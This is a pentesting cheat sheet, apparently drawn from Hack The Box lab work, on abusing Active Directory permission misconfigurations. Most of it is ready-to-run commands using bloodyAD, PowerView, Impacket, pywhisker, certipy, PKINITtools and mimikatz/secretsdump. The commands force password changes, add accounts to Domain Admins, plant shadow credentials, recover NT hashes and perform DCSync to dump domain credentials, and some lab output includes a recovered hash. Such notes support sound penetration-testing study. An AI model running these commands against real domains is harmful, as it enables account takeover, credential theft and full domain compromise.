---
title: "🛠️ ACL/ACE Abuse"
date: 2026-09-03
draft: false
description: "Abusing ACL/ACE misconfigurations in Active Directory: GenericAll, GenericWrite, WriteOwner, WriteDACL and DCSync attack paths."
topics: ["active-directory"]
---


### Generic All

This is also known as full control. This permission allows the trustee to manipulate the target object however they wish.

* https://bloodhound.specterops.io/resources/edges/generic-all

#### Generic All on User

**ForceChangePassword**

The GenericAll permission grants **\<user/attacker>** the ability to change the password of the user **target** without knowing their current password. This is equivalent to the "ForceChangePassword" edge in BloodHound.

```bash
bloodyAD --host 10.10.11.42 -d administrator.htb -u 'attacker' -p '12345678' set password "target" "12345678"
```

#### Generic All on Group

Full control of a group allows you to directly modify group membership of the group.

There are at least two ways to execute this attack.\
The first and most obvious is by using the built-in net.exe binary in Windows:

* `net group "Domain Admins" harmj0y /add /domain`\
  See the opsec considerations tab for why this may be a bad idea.\
  The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView.\
  This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember permission.\
  Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).
* powerview

```powershell
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred
```

* bloodyAD

```bash
bloodyAD --host "10.10.11.41" -d "DOMAIN.LOCAL" -u "user" -p "password" add groupMember 'CN=GROUP,CN=USERS,DC=DOMAIN,DC=LOCAL' "user"
```

### Generic Write

Generic Write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user.

```bash
targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'
```

The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well.

The recovered hash can be cracked offline using the tool of your choice.

#### On User

With GenericWrite over a user, you can write to the “msds-KeyCredentialLink” attribute. Writing to this property allows an attacker to create “Shadow Credentials” on the object and authenticate as the principal using Kerberos PKINIT. See more information under the AddKeyCredentialLink edge.

Alternatively, you can write to the “servicePrincipalNames” attribute and perform a targeted kerberoasting attack. See the abuse section under the WriteSPN edge for more information.

* https://bloodhound.specterops.io/resources/edges/generic-write

### WriteOwner

Object owners retain the ability to modify object security descriptors, regardless of permissions on the object's DACL.

To change the ownership of the object, you may use Impacket's owneredit example script (cf. "grant ownership" reference for the exact link).

```bash
owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'`
```

To abuse ownership of a user object, you may grant yourself the GenericAll permission.

Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).

```bash
dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'`
```

Cleanup of the added ACL can be performed later on with the same tool:

```bash
dacledit.py -action 'remove' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 
'domain'/'controlledUser':'password'`
```

#### WriteOwner on Group

* Add member on that group

```bash
impacket-owneredit -action write -new-owner 'user' -target 'GROUP' 'DOMAIN.LOCAL'/'user':'password'


impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=GROUP,CN=USERS,DC=DOMAIN,DC=LOCAL' 'DOMAIN.LOCAL'/'user':'password'

bloodyAD --host "10.10.11.41" -d "DOMAIN.LOCAL" -u "user" -p "password" add groupMember 'CN=GROUP,CN=USERS,DC=DOMAIN,DC=LOCAL' "user"
```

#### Targeted Kerberoast

* https://github.com/ShutdownRepo/targetedKerberoast

```bash
targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'
```

#### Force Change Password

Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line.

```bash
net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"`
```

It can also be done with pass-the-hash using pth-toolkit's net tool. If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'.

```bash
pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"`
```

```bash
bloodyAD --host 10.10.11.42 -d domain.local -u 'attacker' -p '12345678' set password "target" "12345678"
```

#### Shadow Credentials (msDS-KeyCredentialLink)

```bash
certipy-ad shadow auto -u 'attacker' -p "WqSZAF6CysDQbGb3" -account 'target' -dc-ip '10.10.11.51' 
```

```bash
pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"
...
extract pfx pass
```

* get tgt (ccace)

```bash
python gettgtpkinit.py -cert-pfx oigNgAOY.pfx -pfx-pass F7ddKVbzqkaPtLgqVxFX certified.htb/management_svc management_svc.ccache
```

```bash
export KRB5CCNAME=/home/kali/hack-the-box/machines/lab/certified-medium/management_svc.ccache
```

* extract NTLHash

```bash
python3 ~/tools/PKINITtools/getnthash.py -key 58ca82a35da08a6cd8e33cf3a96172dff0d8d802417f7d43f9036c6c63ab362e certified.htb/management_svc          
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295584

```

```bash
 pywhisker -d "certified.htb" -u judith.mader -p 'judith09' --target 'management_svc' --action "add"  --export PEM        
```

* From pfx extract ccache e NTLM HASH

```bash
python3 ~/tools/PKINITtools/gettgtpkinit.py -cert-pem Whg71xLk_cert.pem -key-pem Whg71xLk_priv.pem certified.htb/management_svc management_svc.ccache

... Extract aes key ..
58ca82a35da08a6cd8e33cf3a96172dff0d8d802417f7d43f9036c6c63ab362e

```

* set `ccache`

```bash
export KRB5CCNAME=/home/kali/hack-the-box/machines/lab/certified-medium/management_svc.ccache
```

* extract NTLHash

```bash
python3 ~/tools/PKINITtools/getnthash.py -key 58ca82a35da08a6cd8e33cf3a96172dff0d8d802417f7d43f9036c6c63ab362e certified.htb/management_svc          
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295584
```

* https://github.com/ShutdownRepo/pywhisker

### DS-Replication-Get-Changes and DS-Replication-Get-Changes-All

* Can you perform DCSync

```bash
#DCsync using mimikatz (You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges):
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DomainName>\<AnyDomainUser>"'

#DCsync using secretsdump.py from impacket with NTLM authentication
secretsdump.py <Domain>/<Username>:<Password>@<DC\'S IP or FQDN> -just-dc-ntlm

# DCsync using secretsdump.py from impacket with Kerberos Authentication
secretsdump.py -no-pass -k <Domain>/<Username>@<DC'S IP or FQDN> -just-dc-ntlm
```

### WriteDacl

With write access to the target object’s DACL, you can grant yourself any privilege you want on the object.

With the ability to modify the DACL on the target object, you can grant yourself almost any privilege against the object you wish

#### Groups

With WriteDACL over a group, grant yourself the right to add members to the group:

```powershell
Add-DomainObjectAcl -TargetIdentity “Domain Admins” -Rights WriteMembers
```

See the abuse info for AddMembers edge for more information about execution the attack from there.

#### Users

With WriteDACL over a user, grant yourself full control of the user object:

```powershell
Add-DomainObjectAcl -TargetIdentity harmj0y -Rights All
```

See the abuse info for GenericAll over a user for more information about how to continue from there.

#### Computers

With WriteDACL over a computer object, grant yourself full control of the computer object:

```powershell
Add-DomainObjectAcl -TargetIdentity windows1 -Rights All
```

See the abuse info for GenericAll over a computer for more information about how to continue from there.

#### Domains

With WriteDACL against a domain object, grant yourself the ability to DCSync:

```powershell
Add-DomainObjectAcl -TargetIdentity testlab.local -Rights DCSync
```

Then perform the DCSync attack.

```bash
bloodyAD --host 10.10.10.161 -u user -p 'password' -d domain add dcsync 'user-target'
```

#### GPS

With WriteDACL over a GPO, grant yourself full control of the GPO:

Add-DomainObjectAcl -TargetIdentity TestGPO -Rights All

Then edit the GPO to take over an object the GPO applies to.

#### OUs

With WriteDACL over an OU, grant yourself full control of the OU:

Add-DomainObjectAcl -TargetIdentity (OU GUID) -Rights All

Then add a new ACE to the OU that inherits down to child objects to take over those child objects.

* https://www.hackingarticles.in/abusing-ad-dacl-writedacl/
* https://bloodhound.specterops.io/resources/edges/write-dacl

### Resources

* https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces.md
* https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces
* https://m8sec.medium.com/active-directory-acl-abuse-with-kali-linux-7434a27dd938
* https://www.thehacker.recipes/ad/movement/dacl/